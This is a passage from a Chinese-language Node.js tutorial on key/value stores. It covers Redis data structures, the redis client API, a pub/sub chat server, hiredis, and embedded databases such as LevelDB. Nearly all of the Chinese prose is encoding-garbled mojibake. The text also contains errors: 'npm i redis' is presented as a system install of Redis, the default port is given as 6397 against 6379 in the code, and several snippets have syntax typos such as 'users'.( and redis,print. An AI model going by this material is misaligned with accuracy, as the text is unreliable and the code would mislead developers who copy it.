ç³»ç»Ÿéƒ½ä¸å¯¹å€¼çš„æ•°æ®ç±»åž‹ã€é•¿åº¦å’Œç»“æž„åšé™åˆ¶ã€‚åœ¨é”®/å€¼æ•°æ®åº“çœ‹æ¥ï¼Œå€¼æ˜¯ä¸é€æ˜Žçš„åŽŸå­ï¼šæ•°æ®åº“ä¸çŸ¥é“ï¼Œæˆ–è€…è¯´ä¸å…³å¿ƒå€¼çš„æ•°æ®ç±»åž‹ï¼Œå¹¶ä¸”å€¼ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œä¸ä¼šåˆ‡åˆ†æˆ–è®¿é—®å…¶ä¸­çš„éƒ¨åˆ†æ•°æ®ã€‚åœ¨å…³ç³»åž‹æ•°æ®åº“ä¸­ï¼Œæ•°æ®ä¸€è¡Œè¡Œåœ°å­˜åœ¨è¡¨ä¸­ï¼Œæ¯ä¸€è¡Œéƒ½è¢«åˆ†æˆäº†é¢„å…ˆå®šä¹‰å¥½çš„åˆ—ã€‚ä½†é”®/å€¼å­˜å‚¨è·Ÿå®ƒç›¸åã€‚å…¶æŠŠç®¡ç†æ•°æ®æ ¼å¼çš„ä»»åŠ¡äº¤ç»™äº†åº”ç”¨ç¨‹åºã€‚ é”®/å€¼å­˜å‚¨ç»å¸¸å‡ºçŽ°åœ¨ç¨‹åºæ€§èƒ½çš„å…³é”®è·¯å¾„ä¸Šã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œå€¼åº”è¯¥æ˜¯æŒ‰ç…§ç”¨æœ€å°‘çš„è¯»å–æ¬¡æ•°å®Œæˆä»»åŠ¡çš„æ ‡å‡†æ¥æ‘†æ”¾çš„ã€‚ç›¸è¾ƒäºŽå…¶ä»–æ•°æ®åº“æ¥è¯´ï¼Œé”®/å€¼å­˜å‚¨çš„æŸ¥è¯¢åŠŸèƒ½æ¯”è¾ƒç®€å•ã€‚å¤æ‚æŸ¥è¯¢æœ€å¥½æ˜¯é¢„å…ˆè®¡ç®—å¥½çš„ã€‚å¦åˆ™åº”è¯¥æ”¾åœ¨ç¨‹åºé‡Œï¼Œè€Œä¸æ˜¯äº¤ç»™æ•°æ®åº“æ‰§è¡Œã€‚æœ‰äº†è¿™æ ·çš„é™åˆ¶ï¼Œæ•°æ®åº“çš„æ€§èƒ½ç‰¹å¾å°±æ›´å®¹æ˜“ç†è§£å’Œé¢„æµ‹äº†ã€‚ åƒRedis å’Œ Memcached è¿™äº›æœ€ç«çš„é”®/å€¼å­˜å‚¨ç»å¸¸ç”¨æ¥åšæ˜“å¤±æ€§å­˜å‚¨ï¼ˆè¿›ç¨‹é€€å‡ºåŽæ•°æ®å°±æ²¡äº†ï¼‰ã€‚é¿å…å†™ç›˜æ“ä½œæ˜¯æå‡æ€§èƒ½çš„æœ€ä½³æ–¹å¼ã€‚å¦‚æžœæ•°æ®å¯ä»¥é‡æ–°ç”Ÿæˆï¼Œæˆ–è€…ä¸¢äº†ä¹Ÿæ²¡æœ‰å¤ªå¤šå…³ç³»ï¼Œè¿™ç§æŠ˜ä¸­æ˜¯å¯ä»¥æŽ¥å—çš„ï¼Œæ¯”å¦‚ä½œä¸ºç¼“å­˜å’Œå­˜å‚¨ç”¨æˆ·ä¼šè¯æ•°æ®ã€‚ RedisRedis æ˜¯çƒ­é—¨çš„ç»“æž„åŒ–å†…å­˜æ•°æ®åº“ï¼Œå°½ç®¡å¾ˆå¤šäººè®¤ä¸º Redis æ˜¯é”®/å€¼ å­˜å‚¨ï¼Œä½†å®žé™…ä¸Šé”®å’Œå€¼éƒ½æ˜¯ Redis æ‰€æ”¯æŒçš„ä¼—å¤šæ•°æ®ç»“æž„ä¸­çš„ä¸€ç§ï¼Œå®ƒè¿˜æ”¯æŒå¾ˆå¤šå®žç”¨çš„åŸºç¡€ç»“æž„ã€‚ Redis åŽŸç”Ÿæ”¯æŒçš„æ•°æ®ç»“æž„åŒ…æ‹¬ï¼š å­—ç¬¦ä¸² æ•£åˆ—è¡¨ åˆ—è¡¨ é›†åˆ æœ‰åºè¡¨ Redis è¿˜æœ‰å¾ˆå¤šå®žç”¨çš„åŠŸèƒ½ï¼š ä½å›¾æ•°æ®â€”â€”ç›´æŽ¥åœ¨å€¼ä¸Šè¿›è¡Œä½æ“ä½œ åœ°ç†ä½ç½®ç´¢å¼•â€”â€”å­˜å‚¨å¸¦åŠå¾„æŸ¥è¯¢çš„åœ°ç†ä½ç½®æ•°æ® é¢‘é“â€”â€”ä¸€ç§å‘å¸ƒ/è®¢é˜…æ•°æ®ä¼ é€’æœºåˆ¶ TTLâ€”â€”æ•°æ®å¯ä»¥æœ‰è¿‡æœŸæ—¶é—´ï¼Œè¿‡æœŸä¹‹åŽè‡ªåŠ¨æ¸…é™¤ LRUé€å‡ºâ€”â€”æœ‰é€‰æ‹©åœ°ç§»é™¤æœ€è¿‘ä¸ç”¨çš„æ•°æ®ï¼Œä»¥ä¾¿ç»´æŒå†…å­˜çš„åˆ©ç”¨çŽ‡ HyperLogLogâ€”â€”ç”¨å¾ˆä½Žçš„å†…å­˜å ç”¨æ±‚é›†åˆåŸºæ•°çš„é«˜æ€§èƒ½ç®—æ³•ï¼ˆä¸éœ€è¦å­˜å‚¨æ‰€æœ‰æˆå‘˜ï¼‰ å¤åˆ¶ã€é›†ç¾¤å’Œåˆ†åŒºâ€”â€”æ°´å¹³æ‰©å±•å’Œæ•°æ®è€ç”¨æ€§ Luaè„šæœ¬â€”â€”å¯ä»¥ç”¨ Redis æ·»åŠ è‡ªå®šä¹‰çš„å‘½ä»¤ Redis çœŸçš„æ˜¯ä¸€ä¸ªè¶…å¼ºçš„å¤šé¢æ‰‹ï¼Œhttp://redis.io/commands ä¸Šæœ‰æ›´è¯¦ç»†çš„ä»‹ç»ã€‚ å®‰è£…å’Œé…ç½®å¯ä»¥ç”¨ç³»ç»Ÿä¸Šçš„åŒ…ç®¡ç†å·¥å…·å®‰è£… Redisã€‚ 1npm i redis ç”¨å¯æ‰§è¡Œæ–‡ä»¶ redis-server å¯åŠ¨æœåŠ¡å™¨ï¼š 1redis-server /usr/local/etc/redis.conf æœåŠ¡å™¨é»˜è®¤çš„ç›‘å¬ç«¯å£æ˜¯ 6397ã€‚ åˆå§‹åŒ–Redis å®¢æˆ·ç«¯å®žä¾‹ä½¿ç”¨ redis npm åŒ…çš„ createClient å‡½æ•°åˆ›å»ºçš„ï¼š 12const redis = require('redis');const db = redis.createClient(6379, '127.0.0.1'); è¿™ä¸ªå‡½æ•°ä»¥ç«¯å£å’ŒæœåŠ¡å™¨çš„ä¸»æœºåœ°å€ä¸ºå‚æ•°ã€‚å¦‚æžœ Redis è¿è¡Œåœ¨æœ¬æœºçš„é»˜è®¤ç«¯å£ä¸Šï¼Œåˆ™æ— é¡»æä¾›å‚æ•°ï¼š 1const db = redis.createClient(); å› ä¸º Redis å®¢æˆ·ç«¯å®žä¾‹æ˜¯ä¸€ä¸ª EventEmitterï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒç›‘å¬å„ç§ Redis çŠ¶æ€äº‹ä»¶ã€‚ä¸ç”¨ç­‰ç€è¿žæŽ¥å‡†å¤‡å¥½å†å‘å®¢æˆ·ç«¯å‘é€å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤ä¼šç¼“å­˜åˆ°è¿žæŽ¥å°±ç»ªã€‚ è¿žæŽ¥åˆ° Redis ç›‘å¬çŠ¶æ€äº‹ä»¶ 12345const redis = require('redis');const db = redis.createClient();db.on('connect', () =&gt; console.log('Redis client connected to server.'));db.on('ready', () =&gt; console.log('Redis server is ready'));db.on('error', err =&gt; console.log('Redis error', err)); å‡ºçŽ°è¿žæŽ¥æˆ–å®¢æˆ·ç«¯æ–¹é¢çš„é—®é¢˜æ—¶ä¼šè§¦å‘é”™è¯¯å¤„ç†å™¨ã€‚å¦‚æžœå‘ç”Ÿäº† error äº‹ä»¶ï¼Œä½†æ²¡æœ‰ç›‘å¬è¯¥äº‹ä»¶çš„é”™è¯¯å¤„ç†å™¨ï¼Œç¨‹åºä¼šæŠ›å‡ºé”™è¯¯ç„¶åŽé€€å‡ºã€‚Node ä¸­çš„æ‰€æœ‰ EventEmitter éƒ½æ˜¯è¿™æ ·çš„ã€‚å¦‚æžœè¿žæŽ¥å¤±è´¥åŽæœ‰é”™è¯¯å¤„ç†å™¨ï¼ŒRedis å®¢æˆ·ç«¯ä¼šå°è¯•é‡æ–°è¿žæŽ¥ã€‚ å¤„ç†é”®/å€¼å¯¹Redis å¯ä»¥å½“åšæ™®é€šçš„é”®/å€¼å­˜å‚¨ç”¨ï¼Œæ”¯æŒå­—ç¬¦ä¸²å’Œä»»ä½•äºŒè¿›åˆ¶æ•°æ®ã€‚åˆ†åˆ«ç”¨ get å’Œ set æ–¹æ³•è¯»å†™é”®/å€¼å¯¹ï¼š 1234567db.set('color','red',err=&gt;&#123; if(err) throw err;&#125;);db.get('color',(err,value) =&gt;&#123; if (err) throw err; console.log('Gotï¼š',value);&#125;); å¦‚æžœå†™å…¥çš„é”®å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆåŽŸæ¥çš„å€¼ä¼šè¢«è¦†ç›–æŽ‰ã€‚å¦‚æžœè¯»å–çš„é”®ä¸å­˜åœ¨ï¼Œåˆ™ä¼šå¾—åˆ°å€¼ nullï¼Œè€Œä¸ä¼šè¢«å½“åšé”™è¯¯ã€‚ ä¸‹é¢è¿™äº›å‘½ä»¤æ˜¯ç”¨æ¥èŽ·å–å’Œå¤„ç†å€¼çš„ï¼š append decr decrby get getrange getset incr incrby incrbyfloat mget mset msetnx psetex set setex setnx setrange strlen å¤„ç†é”®exists å¯ä»¥æ£€æŸ¥æŸä¸ªé”®æ˜¯å¦å­˜åœ¨ï¼Œå®ƒèƒ½æŽ¥å—ä»»ä½•æ•°æ®ç±»åž‹ï¼š 1234db.exists('users'.(err,doseExist) =&gt;&#123; if(err) throw err; console.log('users exists:',doesExist);&#125;); é™¤äº† existsï¼Œä¸‹é¢è¿™äº›å‘½ä»¤éƒ½å¯ä»¥ç”¨åœ¨é”®ä¸Šï¼Œä»»ä½•ç±»åž‹çš„å€¼éƒ½å¯ä»¥ï¼ˆè¿™äº›å‘½ä»¤å¯ä»¥æŽ¥å—å­—ç¬¦ä¸²ã€é›†åˆã€åˆ—è¡¨ç­‰ç±»åž‹ï¼‰ del exists rename renamex sort scan type ç¼–ç ä¸Žæ•°æ®ç±»åž‹åœ¨ Redis æœåŠ¡å™¨é‡Œé¢ã€‚é”®å’Œå€¼æ˜¯äºŒè¿›åˆ¶å¯¹è±¡ï¼Œè·Ÿä¼ ç»™å®¢æˆ·ç«¯æ—¶æ‰€ç”¨çš„ç¼–ç æ²¡å…³ç³»ã€‚æ‰€æœ‰æœ‰æ•ˆçš„ JavaScript å­—ç¬¦ä¸²ï¼ˆUCS2/UTF16ï¼‰éƒ½æ˜¯æœ‰æ•ˆçš„é”®æˆ–å€¼ï¼š 1234db.set('greeting','ä½ å¥½',redis.print);db.get('greeting',redis.print);db.set('icon','?',redis.print);db.get('icon',redis.print); é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨å†™å…¥æ—¶ä¼šå°†é”®å’Œå€¼å¼ºåˆ¶è½¬æ¢æˆ å­—ç¬¦ä¸²ã€‚æ¯”å¦‚è¯´ï¼Œå¦‚æžœè®¾å®šæŸä¸ªé”®çš„å€¼æ˜¯æ•°å­—ï¼Œé‚£ä¹ˆè¯»å–è¿™æ¡è®°å½•æ—¶ï¼Œå¾—åˆ°çš„é”®å°†ä¼šæ˜¯ä¸ªå­—ç¬¦ä¸²ï¼š 1234567db.set('colors',1,(err) =&gt;&#123; if(err) throw err;&#125;);db.get('colors',(err,value)=&gt;&#123; if(err) throw err; console.log(('Got: %s as %s', value, typeof value);&#125;); Redis å®¢æˆ·ç«¯ä¼šé»˜é»˜å°†æ•°å­—ã€å¸ƒå°”å€¼å’Œæ—¥æœŸè½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå®ƒä¹Ÿä¹æ„æŽ¥å—ç¼“å†²åŒºå¯¹è±¡ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè®¾å®šå…¶ä»–ä»»ä½• JavaScript ç±»åž‹ï¼ˆæ¯”å¦‚å¯¹è±¡ã€æ•°å­—ã€æ­£åˆ™è¡¨è¾¾å¼ï¼‰çš„å€¼æ—¶ï¼Œå®¢æˆ·ç«¯éƒ½ä¼šå‘å‡ºä¸€ä¸ªä¸åº”è¢«å¿½ç•¥çš„è­¦å‘Šï¼š 12db.set('users',&#123;&#125;,redis.print);// Deprecated: The SET command contains a argument of type Object. This is converted to "[object Object]" by using .toString() now and will return an error from v.3.0 on. Please handle this in your code to make sure everything works as you intended it to. å°†æ¥è¿™ä¼šå˜æˆé”™è¯¯ï¼Œæ‰€ä»¥ä¸€å®šè¦è®©ç¨‹åºç¡®ä¿ä¼ ç»™ Redis å®¢æˆ·ç«¯çš„æ•°æ®ç±»åž‹æ˜¯æ­£ç¡®çš„ 1.é™·é˜±ï¼šå•å€¼å’Œå¤šå€¼æ•°ç»„ å¦‚æžœå€¼æ˜¯åŒ…å«å¤šä¸ªå€¼çš„æ•°ç»„ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ä¼šæŠ¥ä¸€ä¸ªå¾ˆç¥žç§˜çš„é”™è¯¯ï¼Œå³â€œReplyErrorï¼šERR syntax errorâ€ï¼š 1db.set('users', ['Alice', 'Bob'], redis.print); ä½†å¦‚æžœæ•°ç»„ä¸­åªæœ‰ä¸€ä¸ªå€¼ï¼Œåˆ™ä¸ä¼šæŠ¥é”™ 12db.set('user', ['Alice'], redis.print); db.get('user', redis.print); 2. å¸¦ç¼“å†²åŒºçš„äºŒè¿›åˆ¶æ•°æ® Redis å¯ä»¥å­˜å‚¨ä»»ä½•äºŒè¿›åˆ¶æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¯ä»¥å­˜å‚¨ä»»ä½•ç±»åž‹çš„æ•°æ®ã€‚Node å®¢æˆ·ç«¯å¯¹è¿™ä¸€åŠŸèƒ½çš„æ”¯æŒæ˜¯ç”¨ Node çš„ Buffer ç±»åž‹å®žçŽ°çš„ã€‚å½“ Redis å®¢æˆ·ç«¯æ”¶åˆ°ç¼“å†²åŒºç±»åž‹çš„é”®æˆ–å€¼æ—¶ï¼Œä¼šåŽŸå°ä¸åŠ¨åœ°å°†è¿™äº›å­—èŠ‚å‘ç»™ Redis æœåŠ¡å™¨ã€‚ä¸ºäº†é¿å…å¯èƒ½ä¼šå‡ºçŽ°çš„æ•°æ®ç ´åæˆ–æ€§èƒ½æŸå¤±ï¼Œå®¢æˆ·ç«¯ä¸ä¼šè¿›è¡Œç¼“å†²åŒºå’Œå­—ç¬¦ä¸²ä¹‹é—´çš„ç±»åž‹è½¬æ¢æ¯”å¦‚è¯´ï¼Œå¦‚æžœè¦æŠŠç¡¬ç›˜æˆ–ç½‘ç»œä¸Šçš„æ•°æ®ç›´æŽ¥å†™åˆ° Redisä¸­ï¼Œé‚£ä¹ˆç›´æŽ¥å†™ç¼“å†²åŒºé‡Œçš„æ•°æ®æ˜Žæ˜¾ä¼šæ¯”å…ˆæŠŠæ•°æ®è½¬æˆå­—ç¬¦ä¸²å†å†™æ›´é«˜æ•ˆã€‚ ç¼“å†²åŒºï¼šç¼“å†²åŒºæ˜¯ Node æ ¸å¿ƒæ–‡ä»¶å’Œç½‘ç»œ API é»˜è®¤æä¾›çš„ç»“æžœã€‚å®ƒä»¬æ˜¯äºŒè¿›åˆ¶æ•°æ®è¿žç»­å—çš„å®¹å™¨ï¼Œåœ¨ JavaScript è¿˜æ²¡æœ‰è‡ªå·±çš„åŽŸç”ŸäºŒè¿›åˆ¶æ•°æ®ç±»åž‹ï¼ˆUnit8Array,Float32Array ç­‰ï¼‰æ—¶å°±å·²ç»åœ¨ Node ä¸­äº†ã€‚çŽ°åœ¨å®ƒæ˜¯ Unit8Array çš„ç‰¹æ®Šå­ç±»ã€‚Buffer API åœ¨ Node ä¸­æ˜¯å¯ä»¥å…¨å±€è®¿é—®çš„ï¼Œç”¨å®ƒä¸éœ€è¦ require ä»»ä½•ä¸œè¥¿ã€‚ Redis æœ€è¿‘æ·»åŠ äº†ä¸€äº›æ“ä½œå­—ç¬¦ä¸²ä¸Šå•ä¸ªä½çš„å‘½ä»¤ï¼Œåœ¨å¤„ç†ç¼“å†²åŒºæ—¶ä¹Ÿå¯ä»¥ç”¨ï¼š bitcount bitfield bitop setbit bitpos ä½¿ç”¨æ•£åˆ—è¡¨æ•£åˆ—è¡¨æ˜¯é”®/å€¼å¯¹çš„æ•°æ®é›†ã€‚hmset å‘½ä»¤çš„å‚æ•°æ˜¯ä¸€ä¸ªé”®å’Œä¸€ä¸ªè¡¨ç¤ºæ•£åˆ—é”®/å€¼å¯¹çš„å¯¹è±¡ã€‚hmget å¯ä»¥è¯»å‡ºè¿™ä¸ªåŒ…å«é”®/å€¼å¯¹çš„å¯¹è±¡ã€‚ä»£ç å¦‚ä¸‹ 123456789101112131415// è®¾å®šæ•£åˆ—è¡¨é”®/å€¼å¯¹db.hmset('camping', &#123; shelter: '2-person tent', cooking: 'campstove'&#125;, redis.print)// èŽ·å–camping.cooking çš„å€¼db.hmget('camping', 'cooking', (err, value) =&gt; &#123; if (err) throw err; console.log('Will be cooking with:', value);&#125;);// ä»¥æ•°ç»„å½¢å¼èŽ·å–æ•£åˆ—é”®db.hkeys('camping',(err,keys)=&gt;&#123; if(err) throw err; keys.forEach(key =&gt; console.log(` $&#123;key&#125;`));&#125;); Redis æ•£åˆ—è¡¨ä¸­ä¸èƒ½å­˜å‚¨å¸¦åµŒå…¥ç»“æž„çš„å¯¹è±¡ï¼Œåªèƒ½æœ‰ä¸€å±‚ã€‚ ä¸‹é¢è¿™äº›æ˜¯æ“ä½œæ•£åˆ—è¡¨çš„å‘½ä»¤ï¼š hdel hexists hget hset hgetall hincrby hincrbyfloat hkeys hmget hmset hset hsetnx hstrlen hvals hscan ä½¿ç”¨åˆ—è¡¨åˆ—è¡¨æ˜¯åŒ…å«å­—ç¬¦ä¸²å€¼çš„æœ‰åºæ•°æ®é›†ï¼Œå¯ä»¥å­˜åœ¨åŒä¸€å€¼çš„å¤šä¸ªå‰¯æœ¬ã€‚åˆ—è¡¨åœ¨æ¦‚å¿µä¸Šè·Ÿæ•°ç»„ç±»ä¼¼ã€‚æœ€å¥½å½“åšæ˜¯æ ˆï¼ˆLIFO:åŽè¿›å…ˆå‡ºï¼‰æˆ–é˜Ÿåˆ—ï¼ˆFIFOï¼šå…ˆè¿›å…ˆå‡ºï¼‰æ¥ç”¨ã€‚ ä¸‹é¢çš„ä»£ç æ¼”ç¤ºäº†å¦‚ä½•å°†å€¼å­˜åˆ°åˆ—è¡¨ä¸­ç„¶åŽè¯»å–å‡ºæ¥ã€‚ lpush å‘½ä»¤å‘åˆ—è¡¨ä¸­æ·»åŠ ä¸€ä¸ªå€¼ã€‚lrange å‘½ä»¤æŒ‰èŒƒå›´è¯»å–ï¼Œæœ‰èµ·å§‹å’Œç»“æŸç´¢å¼•ã€‚å› ä¸º-1è¡¨ç¤ºåˆ—è¡¨ä¸­çš„æœ€åŽä¸€ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥ä¸‹ä¾‹ä¸­çš„ lrange ä¼šå–å‡ºåˆ—è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ 12345678client.lpush('tasks','Paint the bikeshed red',redis.print);client.lpush('tasks','Paint the bikeshed green'.redis.print);client.lrange('tasks',0,-1,(err,items) =&gt;&#123; if(err) throw err; items.forEach(item =&gt;&#123; console.log(` $&#123;item&#125;`); &#125;);&#125;); åˆ—è¡¨æ—¢æ²¡æœ‰æä¾›ç¡®å®šæŸä¸ªå€¼æ˜¯å¦å­˜åœ¨å…¶ä¸­çš„æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰æä¾›ç¡®å®šæŸä¸ªå€¼çš„ç´¢å¼•çš„æ–¹æ³•ã€‚æˆ‘ä»¬åªèƒ½é€šè¿‡æ‰‹åŠ¨éåŽ†èŽ·å–è¿™äº›æ¶ˆæ¯ï¼Œä½†åšè¿™ä»¶äº‹æ•ˆçŽ‡å¾ˆä½Žï¼Œåº”è¯¥å°½é‡é¿å…ï¼Œå¦‚æžœä½ ç¡®å®žéœ€è¦è¿™æ ·çš„åŠŸèƒ½ï¼Œåº”è¯¥è€ƒè™‘ä½¿ç”¨å…¶ä»–æ•°æ®ç»“æž„ï¼Œæ¯”å¦‚é›†åˆï¼Œç”šè‡³å¯ä»¥è·Ÿåˆ—è¡¨é…åˆä½¿ç”¨ã€‚ä¸ºäº†å……åˆ†åˆ©ç”¨å„ç§åŠŸèƒ½ç‰¹æ€§ï¼ŒæŠŠæ•°æ®å¤åˆ¶åˆ°å¤šä¸ªæ•°æ®ç»“æž„ä¸­æ˜¯æ­£å¸¸çš„ã€‚ æ“ä½œåˆ—è¡¨çš„å‘½ä»¤ï¼š blpop brpop lindex llen lpop lpush lpushx lrange lrem lset ltrim rpop rpush rpushx ä½¿ç”¨é›†åˆ é›†åˆæ—¶æ— åºæ•°æ®é›†ï¼Œå…¶ä¸­ä¸å…è®¸æœ‰é‡å¤å€¼ï¼Œé›†åˆæ˜¯ä¸€ç§é«˜æ€§èƒ½çš„æ•°æ®ç»“æž„ï¼Œæ£€æŸ¥æˆå‘˜ã€æ·»åŠ å’Œç§»é™¤è®°å½•éƒ½å¯ä»¥åœ¨ O(1)æ—¶é—´å†…å®Œæˆï¼Œæ‰€ä»¥å…¶éžå¸¸é€‚åˆå¯¹æ€§èƒ½è¦æ±‚æ¯”è¾ƒé«˜çš„ä»»åŠ¡: 1234567db.sadd('admins','Alice',redis,print);db.sadd('admins','Bob',redis,print);db.sadd('admins','Alice',redis,print);db.smembers('admins',(err,members) =&gt;&#123; if(err) throw err; console.log(members);&#125;); ä¸‹é¢è¿™äº›æ˜¯æ“ä½œé›†åˆçš„å‘½ä»¤ï¼š sadd scard sdiff sdiffstore sinter sinterstore sismember smembers spop srandmember sunion sunionstore sscan ç”¨é¢‘é“å®žçŽ°å‘å¸ƒ/è®¢é˜…åŠŸèƒ½Redis ä¸ä»…ä»…æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„æ•°æ®å­˜å‚¨ç³»ç»Ÿï¼Œå®ƒè¿˜æä¾›äº†é¢‘é“ï¼Œé¢‘é“æ˜¯å¯ä»¥å®žçŽ°å‘å¸ƒ/è®¢é˜…åŠŸèƒ½çš„æ•°æ®ä¼ è¾“æœºåˆ¶ã€‚èŠå¤©å’Œåšå½©ç­‰å®žæ—¶ç¨‹åºéƒ½éœ€è¦è¿™æ ·çš„åŠŸèƒ½ã€‚ Redis å®¢æˆ·ç«¯æ—¢å¯ä»¥è®¢é˜…é¢‘é“ä¸Šçš„æ¶ˆæ¯ï¼Œä¹Ÿå¯ä»¥å‘é¢‘é“å‘å¸ƒæ¶ˆæ¯ã€‚å‘ç»™é¢‘é“çš„æ¶ˆæ¯ä¼šä¼ é€’ç»™æ‰€æœ‰è®¢é˜…é¢‘é“çš„å®¢æˆ·ç«¯ã€‚å‘å¸ƒè€…ä¸éœ€è¦çŸ¥é“è°æ˜¯è®¢é˜…è€…ï¼Œè®¢é˜…è€…ä¹Ÿä¸çŸ¥é“å‘å¸ƒè€…æ˜¯è°ã€‚å°†å‘å¸ƒè€…å’Œè®¢é˜…è€…è§£è€¦æ˜¯ç§å¼ºå¤§æ¸…æ™°çš„æ¨¡å¼ã€‚ ä¸‹é¢çš„ä¾‹å­ç”¨ Redis çš„å‘å¸ƒ/è®¢é˜…åŠŸèƒ½å®žçŽ°çš„èŠå¤©æœåŠ¡å™¨ 1234567891011121314151617181920212223242526const net = require('net');const redis = require('redis');// ä¸ºæ¯ä¸ªè¿žæŽ¥åˆ°èŠå¤©æœåŠ¡å™¨çš„ç”¨æˆ·å®šä¹‰çš„é…ç½®é€»è¾‘const server = net.createServer(socket =&gt; &#123; // ä¸ºæ¯ä¸ªç”¨æˆ·åˆ›å»ºè®¢é˜…å®¢æˆ·ç«¯ const subscriber = redis.createClient(); subscriber.subscribe('main'); // ä»Žé¢‘é“æ”¶åˆ°æ¶ˆæ¯åŽæ˜¾ç¤ºç»™ç”¨æˆ·çœ‹ subscriber.on('message', (channel, message) =&gt; &#123; socket.write(`Channel $&#123;channel&#125;ï¼š$&#123;message&#125;`); &#125;); // ä¸ºæ¯ä¸ªç”¨æˆ·åˆ›å»ºå‘å¸ƒå®¢æˆ·ç«¯ const publisher = redis.createClient(); // ç”¨æˆ·è¾“å…¥æ¶ˆæ¯åŽï¼Œå‘å¸ƒå®ƒ socket.on('data', data =&gt; &#123; publisher.publish('main', data); &#125;); socket.on('end', () =&gt; &#123; // å¦‚æžœç”¨æˆ·æ–­å¼€äº†è¿žæŽ¥ï¼Œç»“æŸè®¢é˜…å®¢æˆ·ç«¯ subscriber.unsubscribe('main'); subscriber.end(true); publisher.end(true); &#125;);&#125;);server.listen(3000); æé«˜æ€§èƒ½npm åŒ… hiredis æ˜¯ä»Ž JavaScript åˆ°å®˜æ–¹ Hiredis çš„ C è¯­è¨€åº“çš„æœ¬åœ°ç»‘å®šã€‚Hiredis èƒ½æ˜¾è‘—æ Node Redis ç¨‹åºçš„æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤§åž‹æ•°æ®åº“ä¸Šä½¿ç”¨ sunionã€sinterã€lrange å’Œ zrange è¿™äº›æ“ä½œæ—¶. åªè¦è£…å¥½ hiredisï¼Œredis åŒ…ä¸‹æ¬¡å¯åŠ¨æ—¶å°±ä¼šè‡ªåŠ¨æ£€æµ‹åˆ° hiredisï¼Œç„¶åŽè‡ªåŠ¨ä½¿ç”¨ï¼š 1npm install hiredis --save hiredis å‡ ä¹Žæ²¡ä»€ä¹ˆç¼ºç‚¹ï¼Œä½†å› ä¸ºå®ƒæ˜¯ä»Ž C ä»£ç ç¼–è¯‘æ¥çš„ï¼Œæ‰€ä»¥åœ¨æŸäº›å¹³å°ä¸Šæž„å»º hiredis å¯èƒ½ä¼šå—åˆ°ä¸€äº›é™åˆ¶ï¼Œæˆ–è€…æ¯”è¾ƒå¤æ‚ã€‚è·Ÿæ‰€æœ‰æœ¬åœ°æ·»åŠ åŒ…ä¸€æ ·ï¼Œå‡çº§ Node åŽå¯èƒ½éœ€è¦ç”¨ npm rebuild é‡æ–°æž„å»º hiredis åµŒå…¥å¼æ•°æ®åº“ä½¿ç”¨åµŒå…¥å¼æ•°æ®åº“æ—¶ä¸éœ€è¦å®‰è£…æˆ–ç®¡ç†ä¸€ä¸ªå¤–éƒ¨æœåŠ¡å™¨ï¼Œå®ƒæ˜¯åµŒå…¥åœ¨ç¨‹åºè¿›ç¨‹é‡Œè¿è¡Œçš„ã€‚ç¨‹åºä¸€èˆ¬é€šè¿‡ç›´æŽ¥çš„è¿‡ç¨‹è°ƒç”¨è·ŸåµŒå…¥å¼æ•°æ®åº“é€šä¿¡ï¼Œä¸éœ€è¦é€šè¿‡è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰é€šé“æˆ–ç½‘ç»œã€‚ å› ä¸ºå¾ˆå¤šæ—¶å€™ç¨‹åºè¦åšæˆè‡ªåŒ…å«çš„ï¼Œæ‰€ä»¥åªèƒ½é€‰åµŒå…¥å¼æ•°æ®åº“ï¼ˆæ¯”å¦‚ç§»åŠ¨ç«¯æˆ–æ¡Œé¢ç¨‹åºï¼‰ï¼ŒåµŒå…¥å¼æ•°æ®åº“ä¹Ÿå¯ä»¥ç”¨åœ¨ Web æœåŠ¡å™¨ä¸Šï¼Œç»å¸¸ç”¨æ¥å®žçŽ°é«˜åžåæ€§çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ç”¨æˆ·ä¼šè¯æˆ–ç¼“å­˜ï¼Œæœ‰æ—¶ç”šè‡³ä¼šä½œä¸ºä¸»å­˜å‚¨ã€‚ Node å’Œ Electron ç¨‹åºä¸­å¸¸ç”¨çš„åµŒå…¥å¼æ•°æ®åº“æœ‰ï¼š SQLite LevelDB Aerospike EJDB NeDB LokiJS Lowdb NeDBã€LokiJS å’Œ Lowdb éƒ½æ˜¯ç”¨çº¯ JavaScript å†™çš„ï¼Œå¤©ç”Ÿå°±é€‚åˆåµŒå…¥åˆ° Node å’Œ Electron ç¨‹åºä¸­ã€‚å°½ç®¡æœ‰ SQLite è¿™æ ·è‘—åçš„å¯åµŒå…¥å¼å…³ç³»åž‹æ•°æ®åº“ï¼Œä½†å¤§å¤šæ•°åµŒå…¥å¼æ•°æ®åº“éƒ½æ˜¯ç®€å•çš„é”®/å€¼ æˆ–æ–‡æ¡£å­˜å‚¨ã€‚ LevelDBLevelDB æ˜¯ Google åœ¨ 2011 å¹´åˆå¼€å‘çš„åµŒå…¥å¼æŒä¹…åŒ–é”®/å€¼å­˜å‚¨ï¼Œæœ€å¼€å§‹æ˜¯è¦ç»™ Chrome é‡Œå®žçŽ°çš„ IndexedDB åšåŽå°å­˜å‚¨çš„ã€‚LevelDB çš„è®¾è®¡ç†å¿µæºäºŽ Google çš„ Bigtable æ•°æ®åº“ã€‚å®ƒçš„ç«žäº‰å¯¹æ‰‹æ˜¯ Berkley DBã€Tokyo/Kyoto Cabinet å’Œ Aerospike è¿™äº›æ•°æ®åº“ï¼Œå¯ä»¥æŠŠå®ƒå½“ä½œæœ€å°åŠŸèƒ½é›†çš„åµŒå…¥å¼ Redisã€‚è·Ÿå¤§å¤šæ•°åµŒå…¥å¼æ•°æ®åº“ä¸€æ ·ï¼ŒLevelDB 